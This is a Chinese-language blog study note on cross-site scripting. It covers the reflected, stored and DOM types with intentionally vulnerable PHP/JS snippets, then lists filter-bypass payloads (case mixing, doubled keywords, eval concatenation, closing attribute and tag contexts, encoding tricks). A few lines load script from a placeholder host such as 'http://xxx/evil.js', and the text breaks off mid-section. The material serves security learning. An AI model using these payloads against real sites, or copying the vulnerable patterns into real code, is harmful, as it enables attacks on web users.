<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>XSS | Khaz</title><meta name="author" content="Khaz"><meta name="copyright" content="Khaz"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言主要在 https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;9606 基础上进行学习 漏洞概述 跨站脚本（英语：Cross-site scripting，通常简称为：XSS）是一种网站应用程序的安全漏洞攻击。这类漏洞能够使得攻击者嵌入恶意脚本代码到正常用户会访问到的页面中，当正常用户访问该页面时，则可导致嵌入的恶意脚本代码的执行，从而达到恶意攻击用户的目的。 类型  反射型 用户输入什么网站返回什">
<meta property="og:type" content="article">
<meta property="og:title" content="XSS">
<meta property="og:url" content="http://fgtbnc.github.io/2023/06/01/XSS/index.html">
<meta property="og:site_name" content="Khaz">
<meta property="og:description" content="前言主要在 https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;9606 基础上进行学习 漏洞概述 跨站脚本（英语：Cross-site scripting，通常简称为：XSS）是一种网站应用程序的安全漏洞攻击。这类漏洞能够使得攻击者嵌入恶意脚本代码到正常用户会访问到的页面中，当正常用户访问该页面时，则可导致嵌入的恶意脚本代码的执行，从而达到恶意攻击用户的目的。 类型  反射型 用户输入什么网站返回什">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://fgtbnc.github.io/images/wallhaven-j8lqmp.jpg">
<meta property="article:published_time" content="2023-06-01T11:50:25.000Z">
<meta property="article:modified_time" content="2023-06-15T14:40:44.648Z">
<meta property="article:author" content="Khaz">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://fgtbnc.github.io/images/wallhaven-j8lqmp.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://fgtbnc.github.io/2023/06/01/XSS/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":250},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":50,"languages":{"author":"作者: Khaz","link":"链接: ","source":"来源: Khaz","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#2d3035","position":"bottom-left"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'XSS',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-06-15 22:40:44'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/custom/beauty.css" media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s1.ax1x.com/2023/05/31/p9x0Eg1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">35</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://fgtbnc.github.io/images/wallhaven-j8lqmp.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Khaz</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">XSS</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-06-01T11:50:25.000Z" title="发表于 2023-06-01 19:50:25">2023-06-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-06-15T14:40:44.648Z" title="更新于 2023-06-15 22:40:44">2023-06-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">9.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>39分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="XSS"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>主要在 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9606">https://xz.aliyun.com/t/9606</a> 基础上进行学习</p>
<h1 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h1><p> <strong>跨站脚本</strong>（英语：Cross-site scripting，通常简称为：XSS）是一种网站应用程序的安全漏洞攻击。这类漏洞能够使得攻击者嵌入恶意脚本代码到正常用户会访问到的页面中，当正常用户访问该页面时，则可导致嵌入的恶意脚本代码的执行，从而达到恶意攻击用户的目的。</p>
<h1 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h1><p><img src="/../images/image-20230524205745342-1686840019396.png" alt="image-20230524205745342"></p>
<ul>
<li><p>反射型</p>
<p>用户输入什么网站返回什么，漏洞成型点在服务器端代码解析引擎</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// 直接将用户输入拼接到html中</span></span><br><span class="line">    <span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>常见场景：搜索功能等将输入直接回显的场景，通常需要诱导受害者点击才能实现攻击。</p>
</li>
<li><p>存储型</p>
<p>用户输入的数据会先存储到数据库中，只要查询到数据库中的脏数据，这些数据回显到页面就会触发XSS，漏洞成型点在<strong>数据库</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// 获取用户输入</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    <span class="variable">$name</span>    = <span class="title function_ invoke__">trim</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 防御sql注入（也不全，$name变量没有过滤）</span></span><br><span class="line">    <span class="variable">$message</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>( <span class="variable">$message</span> );</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 没有考虑到对 XSS 进行过滤,将xss数据存入数据库中</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="subst">$message</span>&#x27;, &#x27;<span class="subst">$name</span>&#x27; );&quot;</span>;</span><br><span class="line">    <span class="comment">// 查询，拼接，触发xss</span></span><br><span class="line">    xxxx；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>常见场景：评论，订单，可以参考sql中的二次注入</p>
</li>
<li><p>DOM型</p>
<p>与服务器无交互，漏洞成型点在**<code>javascript</code>文件解析用户输入时**，触发点在客户端渲染DOM时。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  lang 变量通过 document.location.href（当前页面的 URL）来获取</span></span><br><span class="line"><span class="keyword">var</span> lang = document.location.href.<span class="title function_ invoke__">substring</span>(document.location.href.<span class="title function_ invoke__">indexOf</span>(<span class="string">&quot;default=&quot;</span>)+<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 并且没有任何过滤就直接 URL 解码后输出在了 option 标签中</span></span><br><span class="line">document.<span class="title function_ invoke__">write</span>(<span class="string">&quot;&lt;option value=&#x27;&quot;</span> + lang + <span class="string">&quot;&#x27;&gt;&quot;</span> + <span class="variable">$decodeURI</span>(lang) + <span class="string">&quot;&lt;/option&gt;&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>常见场景：需要审计<code>javascript</code>代码</p>
</li>
</ul>
<h1 id="如何执行javascript"><a href="#如何执行javascript" class="headerlink" title="如何执行javascript"></a>如何执行javascript</h1><ul>
<li>script标签</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>非script标签</p>
<ul>
<li><p><code>on</code>事件</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;a href=<span class="string">&#x27;&#x27;</span> onclick=<span class="string">&#x27;alert(1)&#x27;</span>&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/dom-obj-event.html">HTML DOM 事件对象 | 菜鸟教程</a></p>
</li>
<li><p><code>javascript:</code>  </p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;a href=<span class="string">&#x27;javascript:alert(1)&#x27;</span>&gt;&lt;/a&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(1);</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line">&lt;img src=javascript:alert(1)&gt;    //IE7以下</span><br><span class="line">&lt;form action=&quot;Javascript:alert(1)&quot;&gt;&lt;input type=submit&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>script</code>标签的src属性</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;http://xxx/evil.js&quot;</span>&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h1 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h1><h2 id="绕过空格"><a href="#绕过空格" class="headerlink" title="绕过空格"></a>绕过空格</h2><p>当空格被过滤了时，我们可以用 <code>/</code> 来代替空格：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;img/src=<span class="string">&quot;x&quot;</span>/onerror=<span class="title function_">alert</span>(<span class="number">1</span>);&gt;</span><br></pre></td></tr></table></figure>

<p>也可以：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;img/src=<span class="string">&quot;x&quot;</span>onerror=<span class="title function_">alert</span>(<span class="number">1</span>);&gt;</span><br></pre></td></tr></table></figure>



<h2 id="绕过引号"><a href="#绕过引号" class="headerlink" title="绕过引号"></a>绕过引号</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="regexp">/xss/</span>)&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">`xss`</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://xxx/evil.js</span>&gt;</span></span> &lt;/script&gt;</span><br></pre></td></tr></table></figure>



<h2 id="绕过括号"><a href="#绕过括号" class="headerlink" title="绕过括号"></a>绕过括号</h2><ul>
<li>throw</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;img src=x onerror=<span class="string">&quot;javascript:window.onerror=alert;throw 1&quot;</span>&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmouseover</span>=<span class="string">&quot;javascript:window.onerror=alert;throw 1&gt;</span></span></span></span><br></pre></td></tr></table></figure>

<ul>
<li>反引号</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">alert</span>(<span class="number">1</span>) == alert<span class="string">`1`</span></span><br></pre></td></tr></table></figure>



<h2 id="绕过关键字过滤"><a href="#绕过关键字过滤" class="headerlink" title="绕过关键字过滤"></a>绕过关键字过滤</h2><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;sCRiPt&gt;<span class="title function_">alert</span>(<span class="number">1</span>);&lt;/sCrIpT&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">ImG</span> <span class="attr">sRc</span>=<span class="string">x</span> <span class="attr">onerRor</span>=<span class="string">alert(1);</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;scrscriptipt&gt;<span class="title function_">alert</span>(<span class="number">1</span>);&lt;/scrscriptipt&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">imimgg</span> <span class="attr">srsrcc</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1);</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<h3 id="字符串拼接绕过"><a href="#字符串拼接绕过" class="headerlink" title="字符串拼接绕过"></a>字符串拼接绕过</h3><h4 id="利用eval-函数"><a href="#利用eval-函数" class="headerlink" title="利用eval()函数"></a>利用eval()函数</h4><p>与PHP的eval()函数相同，JavaScript的eval()函数也可以计算 JavaScript 字符串，并把它作为脚本代码来执行。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;x&quot;</span> onerror=<span class="string">&quot;a=&#x27;aler&#x27;;b=&#x27;t&#x27;;c=&#x27;(1)&#x27;;eval(a+b+c)&quot;</span>&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;a=`aler`;b=`t`;c=&#x27;(`xss`);&#x27;;eval(a+b+c)&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">// 在js中，我们可以用反引号代替单双引号</span></span><br></pre></td></tr></table></figure>

<h4 id="利用top"><a href="#利用top" class="headerlink" title="利用top"></a>利用top</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;top[&quot;al&quot;+&quot;ert&quot;](`xss`);&lt;/script&gt;</span><br><span class="line">&lt;script&gt;top[&quot;al&quot;+&quot;ert&quot;](&quot;xss&quot;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>



<h2 id="输出点总结"><a href="#输出点总结" class="headerlink" title="输出点总结"></a>输出点总结</h2><p>WAF最大的问题，在于不知道输出的位置，导致攻击者根据具体环境以及具体输出的标签类型便可以绕过。</p>
<h3 id="输出在属性里"><a href="#输出在属性里" class="headerlink" title="输出在属性里"></a>输出在属性里</h3><p>例如输出的位置位于value属性中：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input value=&quot;[输出]&quot; type=text&gt;</span><br></pre></td></tr></table></figure>

<p>我们可以选择直接闭合标签：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;img src=x onerror=alert(1);&gt;</span><br><span class="line"></span><br><span class="line">// 输出后如下:</span><br><span class="line">// &lt;input value=&quot;&quot;&gt;&lt;img src=x onerror=alert(1);&gt;&quot; type=text&gt;</span><br></pre></td></tr></table></figure>

<p>如果 <code>&lt; &gt;</code> 被过滤的话可以换成选择使用事件来闭合属性，并将后面的引号注释掉或闭合：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot; autofocus onfocus=alert(1)//</span><br><span class="line">&quot; autofocus onfocus=alert(1) &quot;</span><br><span class="line"></span><br><span class="line">// 输出后如下:</span><br><span class="line">// &lt;input value=&quot;&quot; autofocus onfocus=alert(1)//&quot; type=text&gt;</span><br></pre></td></tr></table></figure>

<p>同样还有很多其他的payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot; onmouseover=prompt(0) x=&quot;</span><br><span class="line">&quot; onfocusin=alert(1) autofocus x=&quot;</span><br><span class="line">&quot; onfocusout=alert(1) autofocus x=&quot;</span><br><span class="line">&quot; onblur=alert(1) autofocus a=&quot;</span><br></pre></td></tr></table></figure>

<p>还有一些特殊的场景，如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;input type=&quot;hidden&quot; value=&quot;[输出]&quot; /&gt;</span><br><span class="line">&lt;input value=&quot;[输出点]&quot; type=&quot;hidden&quot;/&gt;</span><br></pre></td></tr></table></figure>

<p>这里只能把input标签闭合，然后直接执行脚本，否则会因为type为hidden导致无法执行脚本。</p>
<h3 id="输出在HTML标签之间"><a href="#输出在HTML标签之间" class="headerlink" title="输出在HTML标签之间"></a>输出在HTML标签之间</h3><p>例如输出的位置如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;div id=&quot;body&quot;&gt;[输出]&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>直接提交 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 即可触发XSS，但是当标签是不能执行脚本的标签时，如下面这几个：</p>
<ul>
<li><code>&lt;title&gt;&lt;/title&gt;</code></li>
<li><code>&lt;textarea&gt;&lt;/textarea&gt;</code></li>
<li><code>&lt;xmp&gt;&lt;/xmp&gt;</code></li>
<li><code>&lt;iframe&gt;&lt;/iframe&gt;</code></li>
</ul>
<p>那么就得先把那个标签闭合（后文会讲到原理），然后在注入XSS语句，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="输出在script标签之间"><a href="#输出在script标签之间" class="headerlink" title="输出在script标签之间"></a>输出在script标签之间</h3><p>例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    var x = &quot;input&quot;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>可控位置在input，可以闭合script标签插入代码，但是同样我们仅仅闭合双引号就可以执行js代码了：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;;alert(1)//</span><br><span class="line"></span><br><span class="line">// 输出后如下:</span><br><span class="line">// &lt;script&gt;var x = &quot;&quot;;alert(1)//&quot;;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h1 id="字符编码绕过"><a href="#字符编码绕过" class="headerlink" title="字符编码绕过"></a>字符编码绕过</h1><p>在XSS中，还有一个绕过关键字过滤的方法，那就是字符编码绕过。这里给出一个编码网站：<a target="_blank" rel="noopener" href="https://bianma.bmcx.com/">https://bianma.bmcx.com/</a></p>
<p>编码属于计算机系统的基础知识，其内容写起来估计也可以出本书了，不过或多或少我们都有所了解，总的来说，编码就是将字符变为二进制数，而解码就是将二进制数还原为字符。从浏览器请求url到在页面上显示出来也经历了一些编码和解码过程，下面大概介绍一下流程。</p>
<h2 id="请求网页解码流程"><a href="#请求网页解码流程" class="headerlink" title="请求网页解码流程"></a>请求网页解码流程</h2><ul>
<li><strong>HTML 编码&#x2F;解码</strong></li>
</ul>
<p>当浏览器接收到服务端发送来的二进制数据后，首先会对其进行HTML解码，呈现出来的就是我们看到的源代码。具体的解码方式依具体情况而定，所以我们需要在页面中指定编码，防止浏览器按照错误的方式解码，造成乱码。</p>
<p>但是在HTML中有些字符是和关键词冲突的，比如 <code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code>，解码之后，浏览器会误认为它们是HTML标签，如果希望正确地显示预留字符，就需要在HTML中使用对应的HTML字符实体。</p>
<p>字符实体是一个转义序列，它定义了一般无法在文本内容中输入的单个字符或符号。一个字符实体以一个&amp;符号开头，后面跟着一个预定义的实体的名称，或用&amp;#开头+实体编号+分号来表示。</p>
<p>常见的HTML字符实体有：</p>
<table>
<thead>
<tr>
<th>显示结果</th>
<th>描述</th>
<th>实体名称</th>
<th>实体编号</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td>空格</td>
<td><code> </code></td>
<td><code> </code></td>
</tr>
<tr>
<td>&lt;</td>
<td>小于号</td>
<td><code>&lt;</code></td>
<td><code>&lt;</code></td>
</tr>
<tr>
<td>&gt;</td>
<td>大于号</td>
<td><code>&gt;</code></td>
<td><code>&gt;</code></td>
</tr>
<tr>
<td>&amp;</td>
<td>和号</td>
<td><code>&amp;</code></td>
<td><code>&amp;</code></td>
</tr>
<tr>
<td>“</td>
<td>引号</td>
<td><code>&quot;</code></td>
<td><code>&quot;</code></td>
</tr>
<tr>
<td>‘</td>
<td>撇号</td>
<td><code>&#39;</code>(IE不支持)</td>
<td><code>&#39;</code></td>
</tr>
</tbody></table>
<p>但并不是所有的字符都有实体名称，但是它们都有自己的实体编号。</p>
<p>一个HTML解析器作为一个状态机，它从输入流中获取字符并按照转换规则转换到另一种状态。在解析过程中，任何时候它只要遇到一个 <code>&lt;</code> 符号（后面没有跟 <code>/</code>符号）就会进入 <strong>标签开始状态(Tag open state)</strong> ，然后转变到 <strong>标签名状态(Tag name state)</strong> 、 <strong>前属性名状态(before attribute name state)</strong> ……最后进入 <strong>数据状态(Data state)</strong> 并释放当前标签的token。当解析器处于 数据状态(Data state) 时，它会继续解析，每当发现一个完整的标签，就会释放出一个token。</p>
<p>简单的说就是，浏览器对HTML解码之后就开始解析HTML文档，将众多标签转化为内容树中的DOM节点，此时识别标签的时候，HTML解析器是无法识别那些被实体编码的内容的，只有建立起DOM树，才能对每个节点的内容进行识别，如果出现实体编码，则会进行实体解码，只要是DOM节点里属性的值，都可以被HTML编码和解析。</p>
<p>所以在PHP中，使用htmlspecialchars()函数把预定义的字符转换为HTML实体，只有等到DOM树建立起来后，才会解析HTML实体，起到了XSS防护作用。</p>
<ul>
<li><strong>URL 解码</strong></li>
</ul>
<p>URL编码是为了允许URL中存在汉字这样的非标准字符，本质是把一个字符转为%加上UTF-8编码对应的16进制数字。所以又称之为Percent-encoding。</p>
<p>在服务端接收到请求时，会自动对请求进行一次URL解码。</p>
<ul>
<li><strong>JavaScript 解码（只支持Unicode）</strong></li>
</ul>
<p>当HTML解析产生DOM节点后，会根据DOM节点来做接下来的解析工作，比如在处理诸如 <code>&lt;script&gt;</code>、<code>&lt;style&gt;</code> 这样的标签时，解析器会自动切换到JavaScript解析模式，而 <code>src</code>、 <code>href</code> 后边加入的 javascript 伪URL，也会进入 JavaScript 的解析模式。</p>
<p>比如 <code>&lt;a href=&quot;javascript:alert(&#39;\u0031&#39;)&quot;&gt;test&lt;/a&gt;</code>，JavaScript 出发了 JavaScript 解释器，JavaScript 会先对内容进行解析，里边有一个转义字符<code>\u0031</code>，前导的 u 表示他是一个unicode 字符，根据后边的数字，解析为“1”，于是在完成 JavaScript 的解析之后变成了 <code>&lt;a href=&quot;javascript:alert(&#39;1&#39;)&quot;&gt;test&lt;/a&gt;</code>。</p>
<p><strong>下面用一个普通的XSS代码来说明一下浏览器对其解析的过程。</strong></p>
<ul>
<li><code>&lt;a href=&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;test&lt;/a&gt;</code></li>
</ul>
<p>首先HTML解析器开始工作，并对href中的字符做HTML解码，接下来URL解析器对href值进行解码，正常情况下URL值为一个正常的URL链接，如：<code>https://www.baidu.com</code>，那么URL解析器工作完成后是不需要其他解码的，但是该环境中URL资源类型为Javascript，因此该环境中最后一步Javascript解析器还会进行解码操作，最后解析的脚本将被执行。</p>
<p>整个解析顺序为3个环节：HTML解码 —&gt;URL解码 —&gt;JS解码</p>
<p>我们可以对XSS攻击向量做这三种编码都可以成功弹框。</p>
<h2 id="HTML-实体编码"><a href="#HTML-实体编码" class="headerlink" title="HTML 实体编码"></a>HTML 实体编码</h2><p>我们可以将DOM节点中的内容转化为HTML实体，因为解析HTML之后建立起节点，然后会对DOM节点里面的HTML实体进行解析。HTML 编码主要分为10进制和16进制，格式为以 <code>&amp;#</code> 开头以分号 <code>;</code> 结尾（也可以不带分号）。</p>
<ul>
<li><code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></li>
</ul>
